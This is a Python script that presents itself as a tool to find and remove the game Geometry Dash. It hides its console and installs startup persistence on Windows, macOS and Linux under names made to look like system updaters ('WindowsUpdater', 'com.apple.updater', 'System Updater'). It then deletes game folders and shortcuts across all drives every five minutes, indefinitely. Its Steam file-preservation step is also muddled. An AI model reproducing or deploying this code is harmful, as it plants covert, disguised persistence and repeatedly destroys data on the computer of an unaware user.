#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced Geometry Dash Detection and Removal Script
Created on Tue Apr  7 12:48:48 2026
@author: mm
"""

import os
import time
import sys
import shutil
import subprocess
import platform
import re
import glob
import hashlib
import json

def hide_console():
    """Hide the console window on Windows"""
    if platform.system() == "Windows":
        try:
            import ctypes
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 6)  # SW_MINIMIZE
        except:
            pass

def parse_vdf(content):
    """Simple VDF parser without external dependencies"""
    result = {}
    stack = [result]
    current_key = None
    
    # Remove comments and normalize whitespace
    lines = content.split('\n')
    for line in lines:
        line = line.strip()
        if not line or line.startswith('//'):
            continue
            
        # Handle quotes
        if '"' in line:
            parts = re.findall(r'"([^"]*)"', line)
            
            if len(parts) >= 2:
                key, value = parts[0], parts[1]
                if value == '{':
                    # Start of a new section
                    new_dict = {}
                    stack[-1][key] = new_dict
                    stack.append(new_dict)
                    current_key = None
                else:
                    # Key-value pair
                    stack[-1][key] = value
                    current_key = key
            elif len(parts) == 1 and line.endswith('{'):
                # Start of a section with just a key
                key = parts[0]
                new_dict = {}
                stack[-1][key] = new_dict
                stack.append(new_dict)
                current_key = None
            elif line == '}':
                # End of a section
                if len(stack) > 1:
                    stack.pop()
    
    return result

def get_steam_libraries():
    """Find all Steam library folders"""
    system = platform.system()
    paths = []

    if system == "Windows":
        default = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam")
    elif system == "Darwin":
        default = os.path.expanduser("~/Library/Application Support/Steam")
    else:  # Linux
        default = os.path.expanduser("~/.steam/steam")

    vdf_path = os.path.join(default, "steamapps", "libraryfolders.vdf")

    if not os.path.exists(vdf_path):
        return [os.path.join(default, "steamapps")]

    try:
        with open(vdf_path, "r", encoding="utf-8") as f:
            content = f.read()
            data = parse_vdf(content)
    except Exception as e:
        print(f"Error reading VDF file: {e}")
        return [os.path.join(default, "steamapps")]

    libs = []
    libraryfolders = data.get("libraryfolders", {})
    
    # Handle different VDF formats
    for key, value in libraryfolders.items():
        if isinstance(value, dict) and "path" in value:
            libs.append(os.path.join(value["path"], "steamapps"))
        elif isinstance(value, str):
            # Some VDF formats might directly store the path
            libs.append(os.path.join(value, "steamapps"))

    return libs

def is_geometry_dash_directory(path):
    """Verify if a directory contains Geometry Dash"""
    if not os.path.exists(path):
        return False
        
    # Check for common Geometry Dash files
    gd_files = [
        "GeometryDash.exe",
        "Resources",
        "CCGameManager.dat",
        "CCLocalLevels.dat"
    ]
    
    # Check if any of the key files exist
    for file in gd_files:
        if os.path.exists(os.path.join(path, file)):
            return True
    
    # Check for executable name variations
    exe_files = glob.glob(os.path.join(path, "*.exe"))
    for exe in exe_files:
        filename = os.path.basename(exe).lower()
        if "geometry" in filename and "dash" in filename:
            return True
    
    # Additional check for macOS app bundles
    if platform.system() == "Darwin":
        if os.path.exists(os.path.join(path, "Contents", "MacOS", "Geometry Dash")):
            return True
    
    return False

def find_steam_geometry_dash():
    """Find Geometry Dash installs in Steam libraries"""
    gd_paths = []

    for lib in get_steam_libraries():
        install_path = os.path.join(lib, "common", "Geometry Dash")
        if is_geometry_dash_directory(install_path):
            gd_paths.append(install_path)

    return gd_paths

def find_epic_games_geometry_dash():
    """Find Geometry Dash in Epic Games Launcher"""
    system = platform.system()
    
    if system == "Windows":
        # Default Epic Games installation path
        epic_path = os.path.join(os.environ.get("PROGRAMDATA", ""), "Epic", "EpicGamesLauncher", "Data", "Manifests")
        
        if os.path.exists(epic_path):
            # Look for Geometry Dash manifest files
            for item_file in glob.glob(os.path.join(epic_path, "*.item")):
                try:
                    with open(item_file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        if "Geometry Dash" in content:
                            # Extract installation location from manifest
                            match = re.search(r'"InstallLocation":\s*"([^"]+)"', content)
                            if match:
                                install_path = match.group(1)
                                if is_geometry_dash_directory(install_path):
                                    return [install_path]
                except:
                    pass
    
    return []

def find_standalone_geometry_dash():
    """Find standalone or pirated Geometry Dash installations"""
    system = platform.system()
    gd_paths = []
    
    if system == "Windows":
        # Common installation locations
        search_paths = [
            os.path.join(os.environ.get("PROGRAMFILES", ""), "Geometry Dash"),
            os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Geometry Dash"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Geometry Dash"),
            os.path.join(os.environ.get("APPDATA", ""), "Geometry Dash"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads"),
            "C:\\Games",
            "D:\\Games",
            "E:\\Games"
        ]
        
        # Search for Geometry Dash in these paths
        for base_path in search_paths:
            if os.path.exists(base_path) and is_geometry_dash_directory(base_path):
                gd_paths.append(base_path)
        
        # Enhanced search for directories with "Geometry Dash" in the name
        # Search in common user directories first
        user_dirs = [
            os.path.expanduser("~"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/AppData/Local"),
            os.path.expanduser("~/AppData/Roaming"),
            os.path.expanduser("~/AppData/LocalLow"),
        ]
        
        for user_dir in user_dirs:
            if os.path.exists(user_dir):
                for root, dirs, files in os.walk(user_dir):
                    # Limit depth to avoid scanning entire drives for too long
                    depth = root.count(os.sep) - user_dir.count(os.sep)
                    if depth > 4:
                        continue
                        
                    for dir_name in dirs:
                        if "geometry" in dir_name.lower() and "dash" in dir_name.lower():
                            full_path = os.path.join(root, dir_name)
                            if is_geometry_dash_directory(full_path):
                                gd_paths.append(full_path)
        
        # Search for Geometry Dash.exe in all drives
        for drive in ["C:\\", "D:\\", "E:\\", "F:\\"]:
            if os.path.exists(drive):
                try:
                    # Look for Geometry Dash.exe directly
                    exe_paths = glob.glob(os.path.join(drive, "**", "GeometryDash.exe"), recursive=True)
                    for exe_path in exe_paths:
                        gd_dir = os.path.dirname(exe_path)
                        if is_geometry_dash_directory(gd_dir) and gd_dir not in gd_paths:
                            gd_paths.append(gd_dir)
                    
                    # Also check for variations
                    exe_variations = glob.glob(os.path.join(drive, "**", "*Geometry*Dash*.exe"), recursive=True)
                    for exe_path in exe_variations:
                        gd_dir = os.path.dirname(exe_path)
                        if is_geometry_dash_directory(gd_dir) and gd_dir not in gd_paths:
                            gd_paths.append(gd_dir)
                except:
                    pass  # Skip if we don't have permission to search
    
    elif system == "Darwin":  # macOS
        search_paths = [
            "/Applications/Geometry Dash.app",
            os.path.expanduser("~/Applications/Geometry Dash.app"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads")
        ]
        
        for path in search_paths:
            if os.path.exists(path) and is_geometry_dash_directory(path):
                gd_paths.append(path)
        
        # Search for Geometry Dash in user directories
        user_dirs = [
            os.path.expanduser("~"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Documents"),
        ]
        
        for user_dir in user_dirs:
            if os.path.exists(user_dir):
                for root, dirs, files in os.walk(user_dir):
                    # Limit depth to avoid scanning entire drives for too long
                    depth = root.count(os.sep) - user_dir.count(os.sep)
                    if depth > 4:
                        continue
                        
                    for dir_name in dirs:
                        if "geometry" in dir_name.lower() and "dash" in dir_name.lower():
                            full_path = os.path.join(root, dir_name)
                            if is_geometry_dash_directory(full_path):
                                gd_paths.append(full_path)
    
    else:  # Linux
        search_paths = [
            "/usr/games/Geometry Dash",
            "/opt/Geometry Dash",
            os.path.expanduser("~/Games/Geometry Dash"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads")
        ]
        
        for path in search_paths:
            if os.path.exists(path) and is_geometry_dash_directory(path):
                gd_paths.append(path)
        
        # Search for Geometry Dash in user directories
        user_dirs = [
            os.path.expanduser("~"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Documents"),
        ]
        
        for user_dir in user_dirs:
            if os.path.exists(user_dir):
                for root, dirs, files in os.walk(user_dir):
                    # Limit depth to avoid scanning entire drives for too long
                    depth = root.count(os.sep) - user_dir.count(os.sep)
                    if depth > 4:
                        continue
                        
                    for dir_name in dirs:
                        if "geometry" in dir_name.lower() and "dash" in dir_name.lower():
                            full_path = os.path.join(root, dir_name)
                            if is_geometry_dash_directory(full_path):
                                gd_paths.append(full_path)
    
    return gd_paths

def find_all_geometry_dash_installations():
    """Find all Geometry Dash installations across different platforms"""
    all_paths = []
    
    # Find Steam installations
    all_paths.extend(find_steam_geometry_dash())
    
    # Find Epic Games installations
    all_paths.extend(find_epic_games_geometry_dash())
    
    # Find standalone/pirated installations
    all_paths.extend(find_standalone_geometry_dash())
    
    # Remove duplicates while preserving order
    seen = set()
    unique_paths = []
    for path in all_paths:
        if path not in seen:
            seen.add(path)
            unique_paths.append(path)
    
    return unique_paths

def backup_save_data(gd_path):
    """Backup Geometry Dash save data before deletion"""
    system = platform.system()
    
    if system == "Windows":
        save_files = [
            os.path.join(gd_path, "CCGameManager.dat"),
            os.path.join(gd_path, "CCLocalLevels.dat")
        ]
        
        backup_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "GeometryDashBackup")
        
    elif system == "Darwin":  # macOS
        save_files = [
            os.path.join(gd_path, "CCGameManager.dat"),
            os.path.join(gd_path, "CCLocalLevels.dat")
        ]
        
        backup_dir = os.path.expanduser("~/Library/Application Support/GeometryDashBackup")
    
    else:  # Linux
        save_files = [
            os.path.join(gd_path, "CCGameManager.dat"),
            os.path.join(gd_path, "CCLocalLevels.dat")
        ]
        
        backup_dir = os.path.expanduser("~/.local/share/GeometryDashBackup")
    
    # Create backup directory if it doesn't exist
    os.makedirs(backup_dir, exist_ok=True)
    
    # Backup save files
    backed_up = False
    for save_file in save_files:
        if os.path.exists(save_file):
            try:
                filename = os.path.basename(save_file)
                timestamp = int(time.time())
                backup_path = os.path.join(backup_dir, f"{filename}.{timestamp}")
                shutil.copy2(save_file, backup_path)
                backed_up = True
                print(f"Backed up: {save_file} -> {backup_path}")
            except Exception as e:
                print(f"Error backing up {save_file}: {e}")
    
    return backed_up

def delete_geometry_dash_data(paths):
    """Delete Geometry Dash data from the given paths while preserving save data"""
    for path in paths:
        try:
            if os.path.exists(path):
                # First, backup save data
                backup_save_data(path)
                
                # For Steam installations, we need to be more careful
                # Check if this is a Steam installation
                if "steamapps" in path and os.path.exists(os.path.join(path, "GeometryDash.exe")):
                    # This is likely a Steam installation
                    # We'll delete most files but keep essential ones for Steam to recognize
                    
                    # Create a temporary directory to keep essential files
                    temp_dir = os.path.join(os.path.dirname(path), "temp_gd_backup")
                    os.makedirs(temp_dir, exist_ok=True)
                    
                    # Files to keep for Steam recognition
                    essential_files = [
                        "appmanifest_322170.acf",  # Steam app manifest
                        "steam_api.dll",
                        "steam_api64.dll"
                    ]
                    
                    # Move essential files to temp directory
                    for file in essential_files:
                        src = os.path.join(os.path.dirname(path), file)
                        if os.path.exists(src):
                            dst = os.path.join(temp_dir, file)
                            shutil.move(src, dst)
                    
                    # Delete the game directory
                    shutil.rmtree(path, ignore_errors=True)
                    print(f"Deleted: {path}")
                    
                    # Recreate the directory and restore essential files
                    os.makedirs(path, exist_ok=True)
                    for file in essential_files:
                        src = os.path.join(temp_dir, file)
                        if os.path.exists(src):
                            dst = os.path.join(os.path.dirname(path), file)
                            shutil.move(src, dst)
                    
                    # Remove temp directory
                    shutil.rmtree(temp_dir, ignore_errors=True)
                else:
                    # For non-Steam installations, just delete everything
                    shutil.rmtree(path, ignore_errors=True)
                    print(f"Deleted: {path}")
        except Exception as e:
            print(f"Error deleting {path}: {e}")

def uninstall_steam_game(app_id):
    """Properly uninstall a Steam game using Steam command line"""
    system = platform.system()
    
    if system == "Windows":
        steam_exe = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam", "steam.exe")
    elif system == "Darwin":  # macOS
        steam_exe = "/Applications/Steam.app/Contents/MacOS/steam"
    else:  # Linux
        steam_exe = os.path.expanduser("~/.steam/steam/steam.sh")
    
    if os.path.exists(steam_exe):
        try:
            # Command to uninstall the game
            subprocess.Popen([steam_exe, "steam://uninstall/" + app_id])
            return True
        except Exception as e:
            print(f"Error uninstalling from Steam: {e}")
    
    return False

def remove_shortcuts():
    """Remove Geometry Dash shortcuts from desktop and start menu"""
    system = platform.system()
    
    if system == "Windows":
        # Desktop shortcuts
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        for shortcut in glob.glob(os.path.join(desktop, "*Geometry Dash*.lnk")):
            try:
                os.remove(shortcut)
                print(f"Removed shortcut: {shortcut}")
            except:
                pass
        
        # Start menu shortcuts
        start_menu = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs")
        for shortcut in glob.glob(os.path.join(start_menu, "*Geometry Dash*.lnk")):
            try:
                os.remove(shortcut)
                print(f"Removed shortcut: {shortcut}")
            except:
                pass
    
    elif system == "Darwin":  # macOS
        # Dock and Launchpad shortcuts
        desktop = os.path.expanduser("~/Desktop")
        for shortcut in glob.glob(os.path.join(desktop, "*Geometry Dash*.app")):
            try:
                shutil.rmtree(shortcut, ignore_errors=True)
                print(f"Removed shortcut: {shortcut}")
            except:
                pass
    
    else:  # Linux
        # Desktop shortcuts
        desktop = os.path.expanduser("~/Desktop")
        for shortcut in glob.glob(os.path.join(desktop, "*geometry*dash*.desktop")):
            try:
                os.remove(shortcut)
                print(f"Removed shortcut: {shortcut}")
            except:
                pass
        
        # Application menu shortcuts
        applications_dir = os.path.expanduser("~/.local/share/applications")
        for shortcut in glob.glob(os.path.join(applications_dir, "*geometry*dash*.desktop")):
            try:
                os.remove(shortcut)
                print(f"Removed shortcut: {shortcut}")
            except:
                pass

def setup_persistence():
    """Set up the script to run on system startup"""
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])
    
    if system == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            print("Set up persistence in Windows Registry")
        except Exception as e:
            print(f"Error setting up Windows persistence: {e}")
    
    elif system == "Darwin":  # macOS
        try:
            launch_agents_path = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(launch_agents_path, exist_ok=True)
            
            plist_path = os.path.join(launch_agents_path, "com.apple.updater.plist")
            with open(plist_path, "w") as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>""")
            subprocess.run(["launchctl", "load", plist_path], check=False)
            print("Set up persistence in macOS LaunchAgents")
        except Exception as e:
            print(f"Error setting up macOS persistence: {e}")
    
    elif system == "Linux":
        try:
            autostart_path = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_path, exist_ok=True)
            
            desktop_path = os.path.join(autostart_path, "system-updater.desktop")
            with open(desktop_path, "w") as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Updater
Exec={script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
            os.chmod(desktop_path, 0o755)
            print("Set up persistence in Linux autostart")
        except Exception as e:
            print(f"Error setting up Linux persistence: {e}")

def main():
    # Hide the console window
    hide_console()
    
    # Set up persistence to run on startup
    setup_persistence()
    
    # Initial scan and removal
    print("Starting initial scan for Geometry Dash installations...")
    gd_paths = find_all_geometry_dash_installations()
    
    if gd_paths:
        print(f"Found {len(gd_paths)} Geometry Dash installation(s):")
        for path in gd_paths:
            print(f"  - {path}")
        
        # Try to properly uninstall from Steam first
        for path in gd_paths:
            if "steamapps" in path:
                uninstall_steam_game("322170")  # Geometry Dash's Steam App ID
        
        # Delete the game data
        delete_geometry_dash_data(gd_paths)
        
        # Remove shortcuts
        remove_shortcuts()
        
        print("Initial removal complete.")
    else:
        print("No Geometry Dash installations found.")
    
    # Main loop to repeatedly check for and delete Geometry Dash data
    while True:
        # Wait for 5 minutes before checking again
        time.sleep(300)
        
        print("Running periodic check for Geometry Dash installations...")
        gd_paths = find_all_geometry_dash_installations()
        
        if gd_paths:
            print(f"Found {len(gd_paths)} new Geometry Dash installation(s):")
            for path in gd_paths:
                print(f"  - {path}")
            
            # Try to properly uninstall from Steam first
            for path in gd_paths:
                if "steamapps" in path:
                    uninstall_steam_game("322170")
            
            # Delete the game data
            delete_geometry_dash_data(gd_paths)
            
            # Remove shortcuts
            remove_shortcuts()
            
            print("Removal complete.")
        else:
            print("No new Geometry Dash installations found.")

if __name__ == "__main__":
    main()